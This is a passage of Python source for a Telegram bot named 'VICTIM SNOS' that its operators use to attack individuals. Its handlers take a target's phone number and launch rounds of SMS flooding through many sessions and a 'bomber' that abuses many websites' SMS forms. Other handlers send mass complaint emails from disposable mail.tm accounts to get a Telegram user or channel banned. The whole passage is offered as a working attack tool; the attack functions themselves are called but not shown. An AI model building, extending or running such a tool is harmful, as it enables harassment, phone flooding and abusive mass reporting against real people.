async def admin_menu(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет прав!", show_alert=True)
        return
    
    await edit_banner(
        cb,
        f"<b>АДМИН-ПАНЕЛЬ</b>\n\nРазрешено пользователей: {len(ALLOWED_USERS)}",
        get_admin_menu()
    )
    await cb.answer()


@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = cb.from_user.id
    
    if not is_user_allowed(user_id):
        await cb.answer("У вас нет прав!", show_alert=True)
        return
    
    sessions_count = get_user_sessions_count(user_id)
    sessions_ready = is_user_sessions_ready(user_id)
    
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    
    await edit_banner(
        cb,
        f"<b>VICTIM SNOS</b>\n\n"
        f"Ваш ID: <code>{user_id}</code>\n"
        f"Ваши сессии: {sessions_count}/{SESSIONS_PER_USER} ({'Готовы' if sessions_ready else 'Загрузка'})\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}",
        menu
    )
    await cb.answer()


@dp.callback_query(F.data == "refresh_sessions")
async def refresh_sessions(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    
    if not is_user_allowed(user_id):
        await cb.answer("У вас нет прав!", show_alert=True)
        return
    
    if user_id in active_attacks:
        await cb.answer("Нельзя обновить сессии во время сноса!", show_alert=True)
        return
    
    await cb.answer("Обновление сессий...")
    asyncio.create_task(refresh_user_sessions(user_id))
    
    await cb.message.answer("Запущено обновление сессий. Это займет около 2-3 минут.")
    await edit_banner(
        cb,
        "<b>СЕССИИ ОБНОВЛЯЮТСЯ</b>\n\nПодождите 2-3 минуты...",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Проверить статус", callback_data="status")]])
    )


@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    
    if not is_user_allowed(user_id):
        await cb.answer("У вас нет прав!", show_alert=True)
        return
    
    sessions_count = get_user_sessions_count(user_id)
    sessions_ready = is_user_sessions_ready(user_id)
    
    await edit_banner(
        cb,
        f"<b>СТАТУС</b>\n\n"
        f"Ваш ID: <code>{user_id}</code>\n"
        f"Ваши сессии: {sessions_count}/{SESSIONS_PER_USER} ({'Готовы' if sessions_ready else 'Загрузка'})\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} ({'Готова' if mail_tm.ready else 'Загрузка'})\n"
        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n"
        f"Задержка SMS: {SESSION_DELAY}с\n"
        f"Доступ: {'Есть' if is_user_allowed(user_id) else 'Нет'}",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="main_menu")]])
    )
    await cb.answer()


# ---------- СНОС НОМЕРА ----------
@dp.callback_query(F.data == "snos")
async def snos_start(cb: types.CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    
    if not is_user_allowed(user_id):
        await cb.answer("У вас нет прав!", show_alert=True)
        return
    
    if not is_user_sessions_ready(user_id):
        await cb.answer("Ваши сессии еще загружаются!", show_alert=True)
        return
    
    if user_id in active_attacks:
        await cb.answer("У вас уже идет снос!", show_alert=True)
        return
    
    await state.set_state(SnosState.waiting_phone)
    await cb.message.edit_text(
        "<b>СНОС НОМЕРА (SMS)</b>\n\nВведите номер телефона:\nФормат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="main_menu")]])
    )
    await cb.answer()


@dp.message(StateFilter(SnosState.waiting_phone))
async def snos_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(SnosState.waiting_count)
    await msg.answer(f"Номер: {phone}\n\nВведите количество раундов (1-10):")


@dp.message(StateFilter(SnosState.waiting_count))
async def snos_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 10:
            await msg.answer("Введите число от 1 до 10!")
            return
    except:
        await msg.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    await state.clear()
    
    active_attacks[user_id] = True
    
    st = await msg.answer(f"<b>СНОС ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}\nСессий: {SESSIONS_PER_USER}")
    
    async def prog(cur, tot, ok, err):
        try:
            await st.edit_text(f"<b>СНОС</b>\n\nНомер: {phone}\nРаунд: {cur}/{tot}\nSMS отправлено: {ok}\nОшибок: {err}")
        except:
            pass
    
    results, ok, err = await snos_attack(user_id, phone, count, prog)
    
    # Обновляем сессии после атаки
    asyncio.create_task(refresh_user_sessions(user_id))
    
    report = generate_snos_report(phone, results, ok, err, user_id)
    
    fn = f"snos_{user_id}_{phone.replace('+', '')}.txt"
    with open(fn, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await msg.answer_document(FSInputFile(fn), caption=f"Снос завершен! SMS отправлено: {ok}")
    os.remove(fn)
    await st.delete()
    
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    await send_banner(msg, "<b>Главное меню</b>", menu)


# ---------- БОМБЕР ----------
@dp.callback_query(F.data == "bomber")
async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    
    if not is_user_allowed(user_id):
        await cb.answer("У вас нет прав!", show_alert=True)
        return
    
    if user_id in active_bombers:
        await cb.answer("У вас уже идет бомбер!", show_alert=True)
        return
    
    await state.set_state(BomberState.waiting_phone)
    await cb.message.edit_text(
        f"<b>БОМБЕР (ВЕБ-ЗАПРОСЫ)</b>\n\nСайтов: {len(BOMBER_WEBSITES)}\n\nВведите номер телефона:\nФормат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="main_menu")]])
    )
    await cb.answer()


@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await msg.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")


@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 5:
            await msg.answer("Введите число от 1 до 5!")
            return
    except:
        await msg.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    await state.clear()
    
    active_bombers[user_id] = True
    
    st = await msg.answer(f"<b>БОМБЕР ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}\nСайтов: {len(BOMBER_WEBSITES)}")
    
    async def prog(cur, tot, ok, err):
        try:
            await st.edit_text(f"<b>БОМБЕР</b>\n\nНомер: {phone}\nРаунд: {cur}/{tot}\nЗапросов: {ok}\nОшибок: {err}")
        except:
            pass
    
    results, ok, err = await bomber_attack(phone, count, prog)
    
    report = generate_bomber_report(phone, results, ok, err)
    
    fn = f"bomber_{user_id}_{phone.replace('+', '')}.txt"
    with open(fn, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await msg.answer_document(FSInputFile(fn), caption=f"Бомбер завершен! Запросов: {ok}")
    os.remove(fn)
    await st.delete()
    
    if user_id in active_bombers:
        del active_bombers[user_id]
    
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    await send_banner(msg, "<b>Главное меню</b>", menu)


# ---------- ЖАЛОБЫ ----------
@dp.callback_query(F.data == "comp_acc")
async def comp_acc_menu(cb: types.CallbackQuery):
    if not mail_tm.ready:
        await cb.answer("Почта загружается!", show_alert=True)
        return
    await edit_banner(cb, "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВыберите тип жалобы:", get_account_complaint_menu())
    await cb.answer()


@dp.callback_query(F.data == "comp_acc_back")
async def comp_acc_back(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    sessions_count = get_user_sessions_count(user_id)
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    await edit_banner(
        cb,
        f"<b>VICTIM SNOS</b>\n\nВаш ID: {user_id}\nВаши сессии: {sessions_count}/{SESSIONS_PER_USER}\nПочта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
        menu
    )
    await cb.answer()


@dp.callback_query(F.data.startswith("acc_"))
async def comp_acc_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("acc_", "")
    await state.update_data(complaint_type=complaint_type)
    
    if complaint_type == "1.1":
        await state.set_state(ComplaintAccountState.waiting_reason)
        await cb.message.edit_text(
            "<b>ОБЫЧНАЯ ЖАЛОБА</b>\n\nВведите причину жалобы:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="comp_acc")]])
        )
    else:
        await state.set_state(ComplaintAccountState.waiting_username)
        await cb.message.edit_text(
            "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="comp_acc")]])
        )
    await cb.answer()


@dp.message(StateFilter(ComplaintAccountState.waiting_reason))
async def comp_acc_reason(msg: types.Message, state: FSMContext):
    await state.update_data(reason=msg.text.strip())
    await state.set_state(ComplaintAccountState.waiting_username)
    await msg.answer("Введите юзернейм (без @):")


@dp.message(StateFilter(ComplaintAccountState.waiting_username))
async def comp_acc_username(msg: types.Message, state: FSMContext):
    await state.update_data(username=msg.text.strip().replace("@", ""))
    await state.set_state(ComplaintAccountState.waiting_id)
    await msg.answer("Введите Telegram ID:")


@dp.message(StateFilter(ComplaintAccountState.waiting_id))
async def comp_acc_id(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    username = data.get("username", "")
    telegram_id = msg.text.strip()
    complaint_type = data.get("complaint_type", "1.2")
    reason = data.get("reason", "")
    
    body = COMPLAINT_TEXTS_ACCOUNT[complaint_type].format(
        username=username, telegram_id=telegram_id, reason=reason
    )
    
    st = await msg.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint(mail_tm, f"Жалоба на @{username}", body)
    await st.delete()
    
    await msg.answer(f"<b>ГОТОВО!</b>\n\nЮзернейм: @{username}\nID: {telegram_id}\nОтправлено: {sent} писем")
    
    user_id = msg.from_user.id
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    await send_banner(msg, "<b>Главное меню</b>", menu)


@dp.callback_query(F.data == "comp_chan")
async def comp_chan_menu(cb: types.CallbackQuery):
    if not mail_tm.ready:
        await cb.answer("Почта загружается!", show_alert=True)
        return
    await edit_banner(cb, "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВыберите тип жалобы:", get_channel_complaint_menu())
    await cb.answer()


@dp.callback_query(F.data == "comp_chan_back")
async def comp_chan_back(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    sessions_count = get_user_sessions_count(user_id)
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    await edit_banner(
        cb,
        f"<b>VICTIM SNOS</b>\n\nВаш ID: {user_id}\nВаши сессии: {sessions_count}/{SESSIONS_PER_USER}\nПочта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
        menu
    )
    await cb.answer()


@dp.callback_query(F.data.startswith("chan_"))
async def comp_chan_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("chan_", "")
    await state.update_data(complaint_type=complaint_type)
    await state.set_state(ComplaintChannelState.waiting_channel)
    await cb.message.edit_text(
        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="comp_chan")]])
    )
    await cb.answer()


@dp.message(StateFilter(ComplaintChannelState.waiting_channel))
async def comp_chan_link(msg: types.Message, state: FSMContext):
    await state.update_data(channel=msg.text.strip())
    await state.set_state(ComplaintChannelState.waiting_violation)
    await msg.answer("Введите ссылку на нарушение:")


@dp.message(StateFilter(ComplaintChannelState.waiting_violation))
async def comp_chan_violation(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    channel = data.get("channel", "")
    violation = msg.text.strip()
    complaint_type = data.get("complaint_type", "8")
    
    body = COMPLAINT_TEXTS_CHANNEL[complaint_type].format(
        channel_link=channel, violation_link=violation
    )
    
    st = await msg.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint(mail_tm, "Жалоба на канал", body)
    await st.delete()
    
    await msg.answer(f"<b>ГОТОВО!</b>\n\nКанал: {channel}\nОтправлено: {sent} писем")
    
    user_id = msg.from_user.id
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    await send_banner(msg, "<b>Главное меню</b>", menu)


@dp.callback_query(F.data == "stop")
async def stop(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    if user_id in active_attacks:
        del active_attacks[user_id]
    if user_id in active_bombers:
        del active_bombers[user_id]
    
    menu = get_admin_menu() if user_id == ADMIN_ID else get_main_menu()
    await edit_banner(cb, "<b>Остановлено</b>", menu)
    await cb.answer()


# ---------- ЗАПУСК ----------
mail_tm = MailTM()


async def init_mailtm():
    try:
        with open(MAILTM_ACCOUNTS_FILE, 'r') as f:
            mail_tm.accounts = json.load(f)
            mail_tm.ready = True
            logger.info(f"Загружено {len(mail_tm.accounts)} почт")
    except:
        logger.info("Создание почт...")
        await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
        if mail_tm.accounts:
            with open(MAILTM_ACCOUNTS_FILE, 'w') as f:
                json.dump(mail_tm.accounts, f)


async def main():
    load_allowed_users()
    logger.info(f"VICTIM SNOS v7.0 запуск... Сессий на пользователя: {SESSIONS_PER_USER}")
    logger.info(f"Разрешено пользователей: {len(ALLOWED_USERS)}")
    await bot.delete_webhook(drop_pending_updates=True)
    
    asyncio.create_task(init_mailtm())
    
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
